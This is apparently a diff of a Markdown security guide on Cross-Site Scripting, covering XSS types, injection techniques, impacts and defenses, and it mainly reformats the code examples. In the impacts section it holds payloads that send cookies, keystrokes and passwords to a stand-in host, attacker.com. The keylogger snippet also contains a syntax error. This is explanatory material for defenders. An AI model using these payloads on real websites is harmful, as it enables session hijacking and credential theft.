@@ -6,17 +6,20 @@ Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject ma
 1. Stored XSS (Persistent XSS)
     - Description: The malicious script is permanently stored on the target server (e.g., in a database, comment field, or message board). When another user views the affected page, the script is executed in their browser.
     - Example: An attacker submits a malicious JavaScript payload in a comment form. When other users view the comment, the script runs automatically.
-        - ```<script>alert('XSS')</script>```
+        
+            <script>alert('XSS')</script>
     - Impact: Since the payload is stored, every user who views the infected page can be affected, leading to widespread compromise.
 2. Reflected XSS (Non-Persistent XSS)
     - Description: The malicious script is reflected off the web server, usually via a URL or form submission, and is executed immediately when a victim interacts with the crafted link.
     - Example: The attacker sends a victim a malicious link with a script embedded in the query parameter:
-        - ```http://example.com/search?query=<script>alert('XSS')</script>```
+        
+            http://example.com/search?query=<script>alert('XSS')</script>
     - Impact: Typically requires social engineering (e.g., sending a crafted URL), but it can still lead to session hijacking or data theft.
 3. DOM-Based XSS
     - Description: The vulnerability exists in the client-side JavaScript, where data is dynamically inserted into the web page’s DOM without proper sanitization. The attack occurs entirely within the browser.
     - Example:
-        - ```document.location.href = "http://example.com/welcome?name=" + document.getElementById('name').value;```
+        
+            document.location.href = "http://example.com/welcome?name=" + document.getElementById('name').value;
         - If user input is directly inserted into the DOM without sanitization, it can result in XSS.
     - Impact: No server interaction is required. The vulnerability occurs entirely on the client-side, making it harder to detect.
 
@@ -24,44 +27,56 @@ Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject ma
 1. Script Injection
     - Technique: Injecting malicious JavaScript code into input fields or URL parameters to execute in the browser.
     - Example:
-        - ```<script>alert('XSS')</script>```
+        
+            <script>alert('XSS')</script>
     - Testing: Inject ```<script>alert(1)</script>``` into various input fields (e.g., comment forms, search bars) and check if it executes.
 2. Event Handlers
     - Technique: Injecting JavaScript into attributes that trigger events (e.g., ```onload```, ```onclick```, ```onmouseover```).
     - Example:
-        - ```<img src="x" onerror="alert('XSS')">```
+            
+            <img src="x" onerror="alert('XSS')">
     - Testing: Inject event handlers into fields and parameters that accept HTML content.
 3. Attribute Injection
     - Technique: Injecting malicious scripts into HTML attributes, such as ```src```, ```href```, or ```style```.
     - Example:
-        - ```<a href="javascript:alert('XSS')">Click here</a>```
+        
+            <a href="javascript:alert('XSS')">Click here</a>
     - Testing: Test if user input is injected into attributes like ```href``` or ```src``` without proper sanitization.
 4. JavaScript Protocol Injection
     - Technique: Exploiting unsafe handling of URLs where the javascript: protocol is allowed, leading to script execution.
     - Example:
-        - ```<a href="javascript:alert('XSS')">Click me</a>```
+        
+            <a href="javascript:alert('XSS')">Click me</a>
     - Testing: Check if links or inputs accept the ```javascript:``` protocol.
 
 ## Real-World Impacts of XSS
 1. Session Hijacking
     - Description: XSS can steal session cookies using ```document.cookie```, allowing the attacker to hijack the victim’s session.
     - Example:
-        - ```<script>document.location='http://attacker.com?cookie=' + document.cookie</script>```
+        
+            <script>document.location='http://attacker.com?cookie=' + document.cookie</script>
     - Impact: The attacker gains control over the victim’s session, possibly leading to account takeover.
 2. Keylogging
     - Description: XSS can capture user input (e.g., keystrokes, form submissions) by injecting a keylogger script.
     - Example:
-        - ```<script> document.onkeypress = function(e) {  var key = e keyCode || e.which;  document.location='http://attacker.com?key=' + String.fromCharCode(key);} </script>```
+        
+            <script> 
+                document.onkeypress = function(e) {  
+                    var key = e keyCode || e.which;  
+                    document.location='http://attacker.com?key=' + String.fromCharCode(key);} 
+            </script>
     - Impact: Sensitive data like passwords or credit card numbers can be stolen.
 3. Content Spoofing / Defacement
     - Description: Attackers can inject scripts that modify the appearance or content of a web page to mislead users or damage the site’s reputation.
     - Example:
-        - ```<script>document.body.innerHTML="Hacked by Attacker"</script>```
+        
+            <script>document.body.innerHTML="Hacked by Attacker"</script>
     - Impact: Attackers can deface websites or display false information.
 4. Phishing Attacks
     - Description: Attackers inject fake forms or login screens to capture user credentials.
     - Example:
-        - ```<form action="http://attacker.com/steal" method="post">  Enter your password: <input type="password" name="password"></form>```
+        
+            <form action="http://attacker.com/steal" method="post">  Enter your password: <input type="password" name="password"></form>
     - Impact: Users may unknowingly submit sensitive information directly to the attacker.
 
 ## Defense Mechanisms Against XSS
@@ -75,8 +90,9 @@ Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject ma
     - Best Practices:
         - Use appropriate encoding for the context (e.g., HTML encoding for content, URL encoding for URLs).
         - Escape characters like ```<```, ```>```, ```'```, and ```"```.
-    Example (HTML encoding):
-        - ```&lt;script&gt;alert('XSS')&lt;/script&gt;```
+    - Example (HTML encoding):
+        
+            &lt;script&gt;alert('XSS')&lt;/script&gt;
 3. Content Security Policy (CSP)
     - Description: Implement a CSP header to control which scripts can be executed on the page.
     - Best Practices:
